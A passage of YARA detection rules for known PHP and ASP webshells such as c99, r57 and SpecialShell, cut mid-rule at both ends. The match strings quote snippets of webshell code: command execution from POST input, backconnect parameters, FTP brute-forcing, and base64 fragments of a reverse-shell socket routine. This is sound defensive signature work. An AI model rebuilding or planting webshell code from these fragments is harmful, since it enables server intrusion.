		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c01ad0e5-1aff-5128-9d0c-5d0967532a4b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5123-L5137"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7bdaebfb093b58a2fd33b4bbeea8465d0f724383b4855eb521a3e339ee153781"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
		$s2 = "c99sh_sqlquery"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5138-L5154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6dbd40e19d4d5753dbd1f7e627bccc08a60430de8138a923f13e836d19dde65c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
		$s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5155-L5171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "834c33059e08e8075a8d3f69187b74f3b53afabfc37ae1f13a2f579f0948a363"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
		$s1 = ".$arrow.\"</b>\",in('text','"

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5172-L5187"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f97846fdaac949185b4ce6a25cc276f4ae4243d891acb18c3a3ce0c18b540976"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"

	strings:
		$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
		$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
		$s2 = "rst.void.ru"

	condition:
		3 of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7a31b923-15e5-5af4-9ad0-8d261fedf7c4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5188-L5204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "764a374c1e4acec8978db1e7e7e326c4fa95c6f92e1ca5a6d7f892bb05ecd289"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "8023394542cddf8aee5dec6072ed02b5"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo ws(2).$lb.\" <a"
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
		$s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"

	condition:
		2 of them
}

rule SIGNATURE_BASE__Wacking_Php_Php_1_Specialshell_99_Php_Php_C100_Php
{
	meta:
		description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3dac5550-598a-5a0f-95c3-2e0162a686ee"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5205-L5221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0d32fc00ba2602a1140dc9030894bb9524c55b95c445a08f2bf6f8fc60108e64"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "9c5bb5e3a46ec28039e8986324e42792"
		hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
		hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "if(eregi(\"./shbd $por\",$scan))"
		$s1 = "$_POST['backconnectip']"
		$s2 = "$_POST['backcconnmsg']"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "093892f6-ff53-5bd1-b7b2-fea21a9258aa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5222-L5239"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afbd2103b0c953d6aec070ba450f43e567560bc9743423a5731cd4d6e5e36bb6"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "8023394542cddf8aee5dec6072ed02b5"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s1 = "if(rmdir($_POST['mk_name']))"
		$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
		$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "81480945-b684-50b6-9431-4ab7a786b214"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5240-L5256"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9bbcb687c83c01ad52e8978a60e604a74f10c33a63af3b91d0286b30dea42890"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
		$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
		$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Multiple_Php_Webshells
{
	meta:
		description = "Semi-Auto-generated  - from files multiple_php_webshells"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5258-L5279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d55c96febd64107273001edadbda6d0a1b4b00e35fb41b46561b49fca6a9bd1b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "be0f67f3e995517d18859ed57b4b4389"
		hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash4 = "8023394542cddf8aee5dec6072ed02b5"
		hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash6 = "817671e1bdc85e04cc3440bbd9288800"
		hash7 = "7101fe72421402029e2629f3aaed6de7"
		hash8 = "f618f41f7ebeb5e5076986a66593afd1"

	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
		$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5280-L5295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c089f8175532ddc0e2d256b4972f7db32683bd213a456622ed27ab4844d1e435"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"

	strings:
		$s0 = "<b>Dumped! Dump has been writed to "
		$s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
		$s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5330-L5348"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0f44dc1ff243b234a718e8dbd5cc8c4dc8eb9d3b63300a5c6ff72b86280607bf"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "c99ftpbrutecheck"
		$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
		$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
		$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5349-L5365"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e9cd7425b806f71d8889f5df7f3fc2f4a692279fc4e495104646cfe28c5b5fe5"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sqlquicklaunch[] = array(\""
		$s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"

	condition:
		all of them
}

rule SIGNATURE_BASE__Antichat_Php_Php_Fatalshell_Php_Php_A_Gedit_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6bf5640f-0773-5d93-8d27-0844062017c7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5366-L5382"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "789340845aeed4accaef02afa1a1fe420e73b6f5af1b621f4ec2342994045278"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "128e90b5e2df97e21e96d8e268cde7e3"
		hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
		hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"

	strings:
		$s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
		$s1 = "if($action==\"phpeval\"){" fullword
		$s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
		$s3 = "$dir=getcwd().\"/\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__Crystal_Php_Nshell_Php_Php_Load_Shell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a92134cd-7f10-589f-bcda-508bc7a20efe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5397-L5412"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "71a9310b19b66e3699f75f551cc604f535ea843eb9c50f4a009edcd9c11e01b9"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "fdbf54d5bf3264eb1c4bff1fac548879"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "0c5d227f4aa76785e4760cdcff78a661"

	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s1 = "$dires = $dires . $directory;" fullword
		$s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__Nst_Php_Php_Cybershell_Php_Php_Img_Php_Php_Nstview_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cc4dc0e9-dbb1-560b-ae36-23d3e16a407f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5413-L5429"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afc0b1c83644aa323d308471e5978b6b03f444f5f46fbaddac28ff42d524df1e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "ef8828e0bc0641a655de3932199c0527"
		hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash3 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "@$rto=$_POST['rto'];" fullword
		$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
		$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Dc3_Security_Crew_Shell_Priv_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d22c4cc3-842b-5a24-bf4b-a8024b447b9e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5430-L5446"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7a4c74912caa1855efc3a2ea7fa6d0082f62776d77a211e59f12892d4883f240"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "433706fdc539238803fd47c4394b5109"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
		$s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_1_C2007_Php_Php_C100_Php
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5447-L5462"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a5dc73a12d8c8b89bab77b90cb3b561e9daf9db5f5ad550326a2fbce52c1c8da"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash3 = "d089e7168373a0634e1ac18c0ee00085"
		hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Multiple_Php_Webshells_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5463-L5483"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "26fe586ba7f4d1931b2df81aa27543ff422e699fd56b6b1be289a0f8d6954691"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash6 = "09609851caa129e40b0d56e90dfc476c"
		hash7 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
		$s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
		$s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "022d2255-50cd-500b-8d91-8e34f3c46fcf"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5503-L5519"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7ba3d6927dc06bfcd98ee9d7146164ca9a9024ef26eac60fabc8ed1375db618d"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
		$s2 = "'eng_text30'=>'Cat file'," fullword
		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Remexp_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "274c8816-2711-5f12-937e-549ec2d57ce1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5571-L5586"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
		logic_hash = "b3cfa44898629ffa20630436ae10a94ad72f0e793d61e1157a4de649aa048fe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
		$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
		$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
		$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
		$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Dc3_Security_Crew_Shell_Priv
{
	meta:
		description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c83bb4ba-6b4e-5a88-925b-b93d08b304e4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5587-L5603"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b2a4a7174ca170b4e3a8cdf4814c92695134c8a"
		logic_hash = "f93a5d87d4a490844de578067dc0b7bac6b01ceb9130cd7c70a227566e18f16c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
		$s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
		$s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
		$s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Simattacker
{
	meta:
		description = "PHP Webshells Github Archive - file simattacker.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2408fad8-780f-50de-a309-99d14a1d87b6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5604-L5622"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
		logic_hash = "323b68f1d31df647775ad16a85b9f90bce4eac89188160a1e4853f8fec680160"
		score = 75
		quality = 85
		tags = ""
